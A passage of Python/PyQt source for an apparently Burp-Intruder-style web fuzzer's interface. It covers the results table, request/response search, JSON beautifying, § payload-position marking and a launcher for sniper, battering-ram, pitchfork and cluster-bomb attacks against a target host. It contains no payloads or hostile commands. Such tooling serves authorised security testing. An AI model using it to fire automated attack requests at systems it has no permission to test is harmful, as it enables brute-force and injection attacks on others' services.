        res_h_layout = QHBoxLayout(res_header)
        res_h_layout.setContentsMargins(8, 4, 8, 4)
        res_title = QLabel("RESULTS")
        res_title.setStyleSheet(f"color:{COLOR_CRITICAL};font-weight:700;font-size:12px;")
        self.result_count_label = QLabel("0 requests")
        self.result_count_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        res_h_layout.addWidget(res_title)
        res_h_layout.addWidget(self.result_count_label)
        res_h_layout.addStretch()

        # Filter bar
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("Filter by payload or status…")
        self.filter_input.setFixedWidth(200)
        self.filter_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:2px 6px;font-size:11px;")
        self.filter_input.textChanged.connect(self._apply_filter)
        res_h_layout.addWidget(self.filter_input)

        # Results table
        self.results_table = ResultsTable()
        self.results_table.row_selected.connect(self._show_detail)

        # Request/Response detail splitter
        detail_splitter = QSplitter(Qt.Vertical)
        detail_splitter.addWidget(self.results_table)

        # Detail panel
        detail_panel = QFrame()
        detail_panel.setStyleSheet("border:none;")
        dp_layout = QVBoxLayout(detail_panel)
        dp_layout.setContentsMargins(0, 0, 0, 0)
        dp_layout.setSpacing(0)

        self.detail_tabs = QTabWidget()
        self.detail_tabs.setStyleSheet(f"""
            QTabWidget::pane{{border:none;}}
            QTabBar::tab{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};padding:4px 12px;border:none;font-size:12px;}}
            QTabBar::tab:selected{{color:{COLOR_TEXT};border-bottom:2px solid {COLOR_CRITICAL};}}
        """)

        # ── Compact search bar embedded in the tab-bar (corner widget) ────────
        _sc = QWidget()
        _sc.setStyleSheet("background:transparent;")
        _scl = QHBoxLayout(_sc)
        _scl.setContentsMargins(0, 2, 6, 2)
        _scl.setSpacing(3)

        _search_ico = QLabel("🔍")
        _search_ico.setStyleSheet("color:#888;font-size:10px;")
        self.detail_search = QLineEdit()
        self.detail_search.setPlaceholderText("Search…  Ctrl+F")
        self.detail_search.setFixedWidth(150)
        self.detail_search.setFixedHeight(22)
        self.detail_search.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};"
            f"border-radius:3px;padding:0 5px;font-size:11px;")
        self.detail_search.textChanged.connect(self._on_detail_search_changed)

        self.detail_prev_btn = QPushButton("▲")
        self.detail_prev_btn.setFixedSize(20, 22)
        self.detail_prev_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:9px;")
        self.detail_prev_btn.clicked.connect(lambda: self._find_in_detail(backward=True))

        self.detail_next_btn = QPushButton("▼")
        self.detail_next_btn.setFixedSize(20, 22)
        self.detail_next_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:9px;")
        self.detail_next_btn.clicked.connect(lambda: self._find_in_detail(backward=False))

        self.detail_match_label = QLabel("")
        self.detail_match_label.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:10px;min-width:52px;")

        _vsep = QFrame()
        _vsep.setFrameShape(QFrame.VLine)
        _vsep.setFixedHeight(14)
        _vsep.setStyleSheet(f"color:{COLOR_BORDER};")

        self.detail_autoscroll_check = QCheckBox("Auto-scroll")
        self.detail_autoscroll_check.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:10px;")
        self.detail_autoscroll_check.setChecked(False)
        self.detail_autoscroll_check.toggled.connect(
            lambda _: self._on_detail_search_changed(self.detail_search.text()))

        _vsep2 = QFrame()
        _vsep2.setFrameShape(QFrame.VLine)
        _vsep2.setFixedHeight(14)
        _vsep2.setStyleSheet(f"color:{COLOR_BORDER};")

        self.detail_beautify_check = QCheckBox("{ } Beautify JSON")
        self.detail_beautify_check.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:10px;")
        self.detail_beautify_check.setChecked(False)
        self.detail_beautify_check.setToolTip(
            "Pretty-print the body as JSON when the Request/Response body parses as valid JSON.\n"
            "Headers are left untouched; non-JSON bodies are shown unchanged.")
        self.detail_beautify_check.toggled.connect(self._on_beautify_toggled)

        _scl.addWidget(_search_ico)
        _scl.addWidget(self.detail_search)
        _scl.addWidget(self.detail_prev_btn)
        _scl.addWidget(self.detail_next_btn)
        _scl.addWidget(self.detail_match_label)
        _scl.addWidget(_vsep)
        _scl.addWidget(self.detail_autoscroll_check)
        _scl.addWidget(_vsep2)
        _scl.addWidget(self.detail_beautify_check)
        self.detail_tabs.setCornerWidget(_sc, Qt.TopRightCorner)
        # Re-run search when the user switches tabs
        self.detail_tabs.currentChanged.connect(
            lambda _: self._on_detail_search_changed(self.detail_search.text()))

        # Ctrl+F focuses the search input
        sc_find = QShortcut(QKeySequence("Ctrl+F"), self)
        sc_find.activated.connect(self._focus_active_search)

        # ── Request tab ──────────────────────────────────────────────
        self.detail_request = QPlainTextEdit()
        self.detail_request.setReadOnly(True)
        self.detail_request.setStyleSheet(
            f"background:{COLOR_BACKGROUND};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;")
        self.detail_request.setLineWrapMode(QPlainTextEdit.NoWrap)
        self._detail_req_hl = HttpSyntaxHighlighter(self.detail_request.document())

        # ── Response tab ────────────────────────────────────────────
        self.detail_response = QPlainTextEdit()
        self.detail_response.setReadOnly(True)
        self.detail_response.setStyleSheet(
            f"background:{COLOR_BACKGROUND};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;")
        self.detail_response.setLineWrapMode(QPlainTextEdit.NoWrap)
        self._detail_resp_hl = HttpSyntaxHighlighter(self.detail_response.document())

        self.detail_tabs.addTab(self.detail_request, "Request")
        self.detail_tabs.addTab(self.detail_response, "Response")
        dp_layout.addWidget(self.detail_tabs)

        # Raw (un-beautified) text backing the two panes, so toggling the
        # "Beautify JSON" checkbox can re-render without losing the original.
        self._detail_raw_request = ""
        self._detail_raw_response = ""

        detail_splitter.addWidget(detail_panel)
        detail_splitter.setSizes([400, 200])

        rp_layout.addWidget(res_header)
        rp_layout.addWidget(detail_splitter)

        main_splitter.addWidget(self.config_tabs)
        main_splitter.addWidget(right_panel)
        main_splitter.setStretchFactor(0, 2)
        main_splitter.setStretchFactor(1, 3)
        main_splitter.setSizes([380, 620])

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setFixedHeight(6)
        self.progress_bar.setTextVisible(False)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar{{background:{COLOR_ELEVATED_BG};border:none;border-radius:3px;}}
            QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #c00,stop:1 {COLOR_CRITICAL});border-radius:3px;}}
        """)

        # Status bar
        self.status_bar = QLabel("Ready  •  Mark positions with § and configure payloads")
        self.status_bar.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding:3px 8px;background:{COLOR_ELEVATED_BG};border-top:1px solid {COLOR_BORDER};")
        self.status_bar.setFixedHeight(22)

        root.addWidget(top_bar)
        root.addWidget(main_splitter)
        root.addWidget(self.progress_bar)
        root.addWidget(self.status_bar)

    # ── Position management ───────────────────────────────────────────────────

    def _add_position(self):
        """Wrap selected text in § markers."""
        editor = self.request_editor
        cursor = editor.textCursor()
        if cursor.hasSelection():
            sel = cursor.selectedText()
            cursor.insertText(f"§{sel}§")
        else:
            cursor.insertText("§§")
            # Move cursor between the two §
            pos = cursor.position()
            cursor.setPosition(pos - 1)
            editor.setTextCursor(cursor)
        self._update_position_count()

    def _clear_positions(self):
        """Remove all § markers."""
        text = self.request_editor.toPlainText()
        text = text.replace("§", "")
        self.request_editor.setPlainText(text)
        self._update_position_count()

    def _auto_positions(self):
        """Auto-wrap parameter values with § markers."""
        raw = self.request_editor.toPlainText()
        # Clear existing first
        raw = raw.replace("§", "")
        # Find first blank line (headers/body separator)
        if "\n\n" in raw:
            head, body = raw.split("\n\n", 1)
        else:
            head, body = raw, ""

        # Wrap query params in first line
        def wrap_params(s):
            return re.sub(r'(=)([^&\s\r\n§#]+)', r'\1§\2§', s)

        # Request line
        lines = head.split("\n")
        if lines:
            lines[0] = wrap_params(lines[0])
        head = "\n".join(lines)

        # Body params (form or JSON values)
        if body.strip().startswith("{"):
            try:
                obj = json.loads(body)
                def wrap_json_vals(d):
                    if isinstance(d, dict):
                        return {k: f"§{v}§" if isinstance(v, (str, int, float)) else wrap_json_vals(v) for k, v in d.items()}
                    elif isinstance(d, list):
                        return [wrap_json_vals(i) for i in d]
                    return d
                body = json.dumps(wrap_json_vals(obj), indent=2)
            except Exception:
                body = wrap_params(body)
        else:
            body = wrap_params(body)

        self.request_editor.setPlainText(head + ("\n\n" + body if body else ""))
        self._update_position_count()

    def _update_position_count(self):
        text = self.request_editor.toPlainText()
        markers = text.count("§")
        pairs   = markers // 2
        self.pos_count_label.setText(f"{pairs} position{'s' if pairs != 1 else ''}")
        # Sync payload panels
        self._sync_payload_panels_count(pairs)

    def _parse_positions(self) -> Tuple[str, List[Tuple[int, int]]]:
        """Parse template, return clean text + list of (start, end) char offsets."""
        raw = self.request_editor.toPlainText()
        positions = []
        clean = []
        i = 0
        while i < len(raw):
            if raw[i] == "§":
                end_marker = raw.find("§", i + 1)
                if end_marker == -1:
                    clean.append(raw[i])
                    i += 1
                    continue
                start_pos = len(clean)
                inner = raw[i + 1: end_marker]
                clean.extend(list(inner))
                positions.append((start_pos, start_pos + len(inner)))
                i = end_marker + 1
            else:
                clean.append(raw[i])
                i += 1
        return "".join(clean), positions

    # ── Payload panels ────────────────────────────────────────────────────────

    def _add_payload_panel(self):
        n = len(self._payload_panels) + 1
        panel = PayloadConfigPanel(n)
        self._payload_panels.append(panel)
        self.payload_stack.addTab(panel, f"Set {n}")
        self.payload_set_combo.addItem(f"Payload Set {n}")

    def _switch_payload_panel(self, idx: int):
        self.payload_stack.setCurrentIndex(idx)

    def _sync_payload_panels_count(self, n_positions: int):
        """Add or remove payload panels to match position count."""
        attack = self.ATTACK_TYPES.get(self.attack_type_combo.currentText(), "sniper")
        if attack in ("sniper", "battering_ram"):
            needed = 1
        else:
            needed = max(1, n_positions)

        current = len(self._payload_panels)
        if needed > current:
            for _ in range(needed - current):
                self._add_payload_panel()
        elif needed < current:
            for _ in range(current - needed):
                self.payload_stack.removeTab(self.payload_stack.count() - 1)
                self._payload_panels.pop()
                self.payload_set_combo.removeItem(self.payload_set_combo.count() - 1)

    def _adjust_payload_panels(self):
        n = self.request_editor.toPlainText().count("§") // 2
        self._sync_payload_panels_count(n)

    # ── Attack logic ──────────────────────────────────────────────────────────

    def _update_attack_desc(self):
        descs = {
            "Sniper":        "Single payload set. Each position attacked individually, other positions left unchanged.",
            "Battering Ram": "Single payload set. Same payload inserted into ALL positions simultaneously.",
            "Pitchfork":     "Multiple payload sets (one per position). Payloads iterated in parallel.",
            "Cluster Bomb":  "Multiple payload sets. Every combination tested — positions × payload sets (cartesian product).",
        }
        text = self.attack_type_combo.currentText()
        self.atk_desc_label.setText(descs.get(text, ""))

    def _start_attack(self):
        host = self.host_input.text().strip()
        if not host:
            # Try to extract from request
            m = re.search(r'^[Hh]ost:\s*(.+)$', self.request_editor.toPlainText(), re.MULTILINE)
            if m:
                host = m.group(1).strip().split(":")[0]
        if not host:
            QMessageBox.warning(self, "No Host", "Please set target host in the Target tab.")
            self.config_tabs.setCurrentIndex(0)
            return

        template, positions = self._parse_positions()
        if not positions:
            QMessageBox.warning(self, "No Positions", "No § payload positions defined. Use 'Add §' or 'Auto §' in the Positions tab.")
            self.config_tabs.setCurrentIndex(1)
            return

        payload_sets = [p.get_payloads() for p in self._payload_panels]
        if not any(payload_sets):
            QMessageBox.warning(self, "No Payloads", "All payload sets are empty. Configure payloads in the Payloads tab.")
            self.config_tabs.setCurrentIndex(2)
            return

        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80

        attack_type = self.ATTACK_TYPES.get(self.attack_type_combo.currentText(), "sniper")

        self.results_table.clear_results()
        self.result_count_label.setText("0 requests")
        self.progress_bar.setValue(0)
        self.detail_request.clear()
        self.detail_response.clear()
        self._detail_raw_request = ""
        self._detail_raw_response = ""

        self._attack_thread = IntruderAttackThread(
            host         = host,
            port         = port,
            use_ssl      = self.ssl_check.isChecked(),
            template     = template,
            positions    = positions,
            payload_sets = payload_sets,
            attack_type  = attack_type,
            timeout      = self.timeout_spin.value(),
            threads      = self.threads_spin.value(),
            delay_ms     = self.delay_spin.value(),
            grep_extract = self.grep_input.text().strip(),
            follow_redirects = self.follow_redir.isChecked(),
            send_baseline = self.send_baseline_check.isChecked(),
        )
        self._attack_thread.result_row.connect(self._on_result_row)
        self._attack_thread.progress.connect(self._on_progress)
        self._attack_thread.status_update.connect(self._set_status)
        self._attack_thread.attack_done.connect(self._on_attack_done)
        self._attack_thread.error_signal.connect(self._on_attack_error)
        self._attack_thread.start()

        self._is_running = True
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.setText(f"⚔  Attacking {host}:{port} with {attack_type}…")

    def _stop_attack(self):
        if self._attack_thread:
            self._attack_thread.stop()
        self._is_running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.setText("■  Attack stopped")

    def _on_result_row(self, row_data: dict):
        self.results_table.add_result(row_data)
        # Tint baseline row gold so it stands out
        if row_data.get("_baseline"):
            row = self.results_table.rowCount() - 1
            gold = QColor("#b8860b"); gold.setAlpha(120)
            brush = QBrush(gold)
            for col in range(self.results_table.columnCount()):
                item = self.results_table.item(row, col)
                if item:
                    item.setBackground(brush)
        total = self.results_table.rowCount()
        self.result_count_label.setText(f"{total:,} requests")

    def _on_progress(self, done: int, total: int):
        if total > 0:
            pct = int(done * 100 / total)
            self.progress_bar.setValue(pct)
            self.status_bar.setText(f"⚔  {done}/{total} requests sent  ({pct}%)")

    def _on_attack_done(self):
        self._is_running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        total = self.results_table.rowCount()
        self.progress_bar.setValue(100)
        self.status_bar.setText(f"✅  Attack complete  –  {total:,} requests")

    def _on_attack_error(self, err: str):
        self._is_running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.setText(f"❌  Error: {err}")

    def _set_status(self, msg: str):
        self.status_bar.setText(msg)

    def _show_detail(self, row_data: dict):
        self._detail_raw_request = row_data.get("request", "")
        self._detail_raw_response = row_data.get("response", "")
        self.detail_request.setPlainText(self._maybe_beautify(self._detail_raw_request))
        self.detail_response.setPlainText(self._maybe_beautify(self._detail_raw_response))
        # Re-apply search highlights after content loads
        txt = self.detail_search.text()
        if txt:
            QTimer.singleShot(50, lambda: self._on_detail_search_changed(txt))

    def _maybe_beautify(self, text: str) -> str:
        """Pretty-print the body of an HTTP request/response as JSON when
        the "Beautify JSON" checkbox is on and the body parses as valid JSON.

        Headers are left byte-for-byte untouched; if the body isn't valid
        JSON (or the checkbox is off), the original text is returned as-is.
        """
        if not text or not self.detail_beautify_check.isChecked():
            return text

        head, sep, body = "", "", text
        for candidate_sep in ("\r\n\r\n", "\n\n"):
            if candidate_sep in text:
                head, body = text.split(candidate_sep, 1)
                sep = candidate_sep
                break

        stripped = body.strip()
        if not stripped:
            return text

        try:
            parsed = json.loads(stripped)
        except (json.JSONDecodeError, ValueError, TypeError):
            return text

        pretty = json.dumps(parsed, indent=2, ensure_ascii=False)
        return f"{head}{sep}{pretty}" if sep else pretty

    def _on_beautify_toggled(self, _checked: bool):
        """Re-render both panes when the Beautify JSON checkbox is toggled."""
        # Preserve scroll position where possible
        req_scroll = self.detail_request.verticalScrollBar().value()
        resp_scroll = self.detail_response.verticalScrollBar().value()

        self.detail_request.setPlainText(self._maybe_beautify(self._detail_raw_request))
        self.detail_response.setPlainText(self._maybe_beautify(self._detail_raw_response))

        self.detail_request.verticalScrollBar().setValue(req_scroll)
        self.detail_response.verticalScrollBar().setValue(resp_scroll)

        # Re-apply search highlights against the new text
        txt = self.detail_search.text()
        if txt:
            self._on_detail_search_changed(txt)

    def _focus_active_search(self):
        """Ctrl+F: focus the shared search input."""
        self.detail_search.setFocus()
        self.detail_search.selectAll()

    def _on_detail_search_changed(self, text: str):
        """Dispatch search to the currently visible tab's editor."""
        editor = self.detail_request if self.detail_tabs.currentIndex() == 0 else self.detail_response
        self._detail_search_changed(text, editor)

    def _detail_search_changed(self, text: str, editor: QPlainTextEdit):
        """Highlight all matches in *editor* and update the shared counter label."""
        editor.setExtraSelections([])
        if not text:
            self.detail_match_label.setText("")
            return
        doc = editor.document()
        fmt = QTextCharFormat()
        fmt.setBackground(QColor("#b58900"))   # amber highlight
        fmt.setForeground(QColor("#000000"))
        selections = []
        cursor = QTextCursor(doc)
        flags = QTextDocument.FindCaseSensitively if any(c.isupper() for c in text) else QTextDocument.FindFlags()
        first_cursor = None
        count = 0
        while True:
            cursor = doc.find(text, cursor, flags)
            if cursor.isNull():
                break
            count += 1
            sel = QTextEdit.ExtraSelection()
            sel.format = fmt
            sel.cursor = cursor
            selections.append(sel)
            if first_cursor is None:
                first_cursor = QTextCursor(cursor)
        editor.setExtraSelections(selections)
        if first_cursor and self.detail_autoscroll_check.isChecked():
            editor.setTextCursor(first_cursor)
            editor.ensureCursorVisible()
        self.detail_match_label.setText(
            f"{count} match{'es' if count != 1 else ''}" if count else "no match")
        self.detail_match_label.setStyleSheet(
            f"color:{'#e06c75' if count == 0 else COLOR_TEXT_MUTED};font-size:10px;min-width:52px;")

    def _find_in_detail(self, backward: bool = False):
        """Step to the next/previous match in the active editor."""
        text = self.detail_search.text()
        if not text:
            return
        editor = self.detail_request if self.detail_tabs.currentIndex() == 0 else self.detail_response
        flags = QTextDocument.FindBackward if backward else QTextDocument.FindFlags()
        if any(c.isupper() for c in text):
            flags |= QTextDocument.FindCaseSensitively
        found = editor.find(text, flags)
        if not found:
            # Wrap around
            cursor = editor.textCursor()
            cursor.movePosition(QTextCursor.End if not backward else QTextCursor.Start)
            editor.setTextCursor(cursor)
            editor.find(text, flags)

    def _clear_results(self):
        self.results_table.clear_results()
        self.result_count_label.setText("0 requests")
        self.progress_bar.setValue(0)

    def _toggle_auto_scroll(self):
        on = self.auto_scroll_btn.isChecked()
        self.results_table._auto_scroll = on
        self.auto_scroll_btn.setText(f"\u23ec Auto-Scroll: {'ON' if on else 'OFF'}")
        self.detail_request.clear()
        self.detail_response.clear()
        self._detail_raw_request = ""
        self._detail_raw_response = ""

    def _apply_filter(self, text: str):
        """Show/hide rows based on filter text."""
        for row in range(self.results_table.rowCount()):
            match = False
            for col in range(self.results_table.columnCount()):
                item = self.results_table.item(row, col)
                if item and text.lower() in item.text().lower():
                    match = True
                    break
            self.results_table.setRowHidden(row, not match if text else False)

    # ── Public API (called from HTTP History right-click) ─────────────────────

    def load_request(self, raw_request: str, host: str = "", port: int = 0, use_ssl: bool = True):
        self.request_editor.setPlainText(raw_request)
        if host:
            self.host_input.setText(host)
        if port:
            self.port_input.setText(str(port))
        self.ssl_check.setChecked(use_ssl)
        if not host:
            m = re.search(r'^[Hh]ost:\s*(.+)$', raw_request, re.MULTILINE)
            if m:
                h = m.group(1).strip()
                if ":" in h:
                    hh, pp = h.rsplit(":", 1)
                    self.host_input.setText(hh)
                    self.port_input.setText(pp)
                else:
                    self.host_input.setText(h)
        # Switch to Positions tab
        self.config_tabs.setCurrentIndex(1)
        self.status_bar.setText("Request loaded  –  Use 'Auto §' or 'Add §' to mark payload positions")